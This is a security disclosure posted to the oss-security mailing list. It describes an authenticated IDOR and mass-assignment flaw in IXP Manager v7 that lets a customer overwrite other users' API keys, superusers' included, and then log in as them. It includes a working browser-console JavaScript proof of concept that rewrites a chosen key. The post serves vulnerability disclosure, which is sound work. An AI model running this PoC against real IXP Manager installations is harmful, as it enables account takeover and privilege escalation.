X-Archive-Source: openwall-scrape
X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2026/08/14/2
Message-ID: <CA+W5nygF6YakOD0J7_p2eddNBmcQuLSfvfJMeeDL5P-LXPvDsg@mail.gmail.com>
Date: Fri, 14 Aug 2026 20:24:08 +0800
From: Bakabaka_9 <qilunuobakabaka9@...il.com>
To: oss-security@...ts.openwall.com
Subject: IXP Manager: Authenticated IDOR / BOLA + Mass Assignment in API Key Update Allows Overwrite of Other Users’ API Keys (incl. Superuser)
Content-Type: text/plain; charset=utf-8

Hi,

In IXP Manager (tested on v7), an authenticated user with at least
AUTH_CUSTUSER privileges can update or delete arbitrary API key records by
directly addressing their numeric api_keys.id.

The update path mass-assigns request data into the ApiKey model, and the
model permits the apiKey attribute itself to be mass-assigned. As a result,
a low-privileged customer can overwrite another user's API key (including a
superuser's) with an attacker-controlled value, and subsequently
authenticate as that user via the API.

The list endpoint correctly scopes results to the current user:

// app/Http/Controllers/ApiKeyController.php:159-167

return ApiKey::where( 'user_id', Auth::id() )


However, the update/delete paths do not enforce ownership.

*Conditions required for exploitation:*


   1. Valid authenticated account with at least AUTH_CUSTUSER
   2. Ability to obtain a normal CSRF token for the session
   3. Existence of a victim API key row
   4. Knowledge (or enumeration) of the numeric api_keys.id
   5. For superuser escalation, the target key must belong to a superuser
   6. Victim user and default customer must not be disabled

*Simple PoC (run in browser console while logged in as a customer):*

const victimKeyId = 1; // target api_keys.id const newKey =
"poc-admin-key-" + Date.now();

const token = document.querySelector('meta[name="csrf-token"]')?.content ||
document.querySelector('input[name="_token"]')?.value;

await fetch(`/api-key/update/${victimKeyId}`, { method: "POST",
credentials: "include", headers: { "Content-Type":
"application/x-www-form-urlencoded" }, body: new URLSearchParams({ _token:
token, _method: "PUT", apiKey: newKey, description: "overwritten by
customer PoC", expires: "2030-01-01" }) });

console.log(newKey);


After a successful request the new key can be used for API authentication
as the victim.

*Suggested mitigation:*


   - Update to latest IXP-Manager version

